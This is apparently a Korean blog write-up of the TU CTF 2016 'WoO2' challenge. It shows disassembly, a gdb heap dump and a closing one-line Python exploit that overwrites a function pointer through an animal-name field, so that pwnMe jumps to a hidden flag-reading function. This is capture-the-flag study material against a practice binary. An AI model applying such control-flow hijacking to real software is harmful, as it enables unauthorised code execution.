---
title: TU CTF 2016 - WoO2
slug: tu-ctf-2016-woo2
date: 2016-05-17 21:16:00 +0900 KST
categories: [write-up]
markup: mmark
---

TU CTF 2016에서 못푼 문제

```sh
$ ./WoO2
Welcome! I don't think we're in Kansas anymore.
We're about to head off on an adventure!
Select some animals you want to bring along.

Menu Options:
1: Bring a lion
2: Bring a tiger
3: Bring a bear
4: Delete Animal
5: Exit

Enter your choice:
5
$
```

실행하면 이렇게 뜬다.

```text
Enter your choice:
1
Choose the type of lion you want:
1: Congo Lion
2: Barbary Lion
1
Enter name of lion:
AAA
```

동물을 고르면 종류를 고를 수 있고 이름도 지어줄 수 있다.

```x86asm
$ readelf -s WoO2 | grep 'GLOBAL DEFAULT   13'
    45: 0000000000400fb0     2 FUNC    GLOBAL DEFAULT   13 __libc_csu_fini
    48: 0000000000400a11   131 FUNC    GLOBAL DEFAULT   13 makeLion
    59: 0000000000400a94   155 FUNC    GLOBAL DEFAULT   13 pickTigerType
    65: 0000000000400989   136 FUNC    GLOBAL DEFAULT   13 pickLionType
    67: 0000000000400eaf    51 FUNC    GLOBAL DEFAULT   13 printWelcome
    69: 0000000000400c39   168 FUNC    GLOBAL DEFAULT   13 makeBear
    72: 0000000000400b2f   131 FUNC    GLOBAL DEFAULT   13 makeTiger
    73: 0000000000400f40   101 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    76: 0000000000400bb2   135 FUNC    GLOBAL DEFAULT   13 pickBearType
    78: 0000000000400820     0 FUNC    GLOBAL DEFAULT   13 _start
    79: 0000000000400e5e    81 FUNC    GLOBAL DEFAULT   13 printMenu
    81: 0000000000400ee2    93 FUNC    GLOBAL DEFAULT   13 main
    82: 0000000000400ce1    67 FUNC    GLOBAL DEFAULT   13 pwnMe
    85: 0000000000400d90   206 FUNC    GLOBAL DEFAULT   13 makeStuff
    86: 000000000040090d   124 FUNC    GLOBAL DEFAULT   13 l33tH4x0r
    92: 0000000000400d24   108 FUNC    GLOBAL DEFAULT   13 deleteAnimal
```

`l33tH4x0r` 함수를 보면

```x86asm
Dump of assembler code for function l33tH4x0r:
   0x000000000040090d <+0>:     push   rbp
   0x000000000040090e <+1>:     mov    rbp,rsp
   0x0000000000400911 <+4>:     sub    rsp,0x50
   0x0000000000400915 <+8>:     mov    rax,QWOR PTR fs:0x28
   0x000000000040091e <+17>:    mov    QWORD PRT [rbp-0x8],rax
   0x0000000000400922 <+21>:    xor    eax,eax
   0x0000000000400924 <+23>:    mov    esi,0x400fc8
   0x0000000000400929 <+28>:    mov    edi,0x400fca
   0x000000000040092e <+33>:    call   cx4007f0 <fopen&plt>
```

`flag.txt`(0x400fca)를 여는 함수다.
그런데 이 함수를 호출하는 함수가 없다.

Enter your choice:에서 4919를 입력하면 pwnMe 함수가 실행되는데,
pwnMe 함수를 보면

```x86asm
Dump of assembler code for function pwnMe:
   0x0000000000400ce1 <+0>:     push   rbp
   0x0000000000400ce2 <+1>:     mov    rbp,rsp
   0x0000000000400ce5 <+4>:     sub    rsp,0x10
   0x0000000000400ce9 <+8>:     mov    eax,DWORD PTR [rip+0x2013d1]     # 0x6020c0 <bearOffset>
   0x0000000000400cef <+14>:    cdqe
   0x0000000000400cf1 <+16>:    mov    rax,QWORD PTR [rax*8+0x6020e0]
   0x0000000000400cf9 <+24>:    mov    QWORD PTR [rbp-0x10],rax
   0x0000000000400cfd <+28>:    mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400d01 <+32>:    mov    eax,DWORD PTR [rax+0x14]
   0x0000000000400d04 <+35>:    cmp    eax,0x3
   0x0000000000400d07 <+38>:    jne    0x400d1a <pwnMe+57>
   0x0000000000400d09 <+40>:    mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400d0d <+44>:    mov    rax,QWORD PTR [rax]
   0x0000000000400d10 <+47>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400d14 <+51>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400d18 <+55>:    call   rax
   0x0000000000400d1a <+57>:    mov    edi,0x0
   0x0000000000400d1f <+62>:    call   0x400810 <exit@plt>
```

pwnMe+35에서 eax는 동물의 종류를 고를 때의 숫자,
pwnMe+55에서 rax는 동물의 이름의 헥사값을 가리킨다.

예를 들어 lion, tiger, bear순으로 각각 타입은 1, 2, 3,
이름은 AAA, BBB, CCC라고 이름을 지으면 메모리는 상황은 다음 스크린샷과 같다.

```x86asm
(gdb) x/24x 0x603010
0x603010:       0x0a414141      0x00000000      0x00000000      0x00000000
0x603020:       0x00000000      0x00000001      0x00000021      0x00000000
0x603030:       0x0a424242      0x00000000      0x00000000      0x00000000
0x603040:       0x00000000      0x00000002      0x00000021      0x00000000
0x603050:       0xdeadbeef      0x00000000      0x0a434343      0x00000000
0x603060:       0x00000000      0x00000003      0x00020fa1      0x00000000
```

bear를 만드는 함수는 다른 동물을 만드는 함수와 달라서
이름이 들어갈 자리에 0xdeadbeef가 들어가니까 bear는 만들지 말고,
다른 동물을 만들어서 l33tH4x0r 함수 주소를 입력하면 실행시킬 수 있다.

그런데 난 주소가 64비트인 걸 생각 안하고
\x0d\x09\x40\x00만 죽어라 입력하다가 못풀었다.
컴퓨터는 개행문자까지 포함해서 0x0a0040090d를 호출하려고 시도했던 것ㅠㅠ

풀이

```sh
python -c "print '2\n3\n' + '\x0d\x09\x40\x00\x00\x00\x00\x00' + '\n4919\n'" | ./WoO2
```
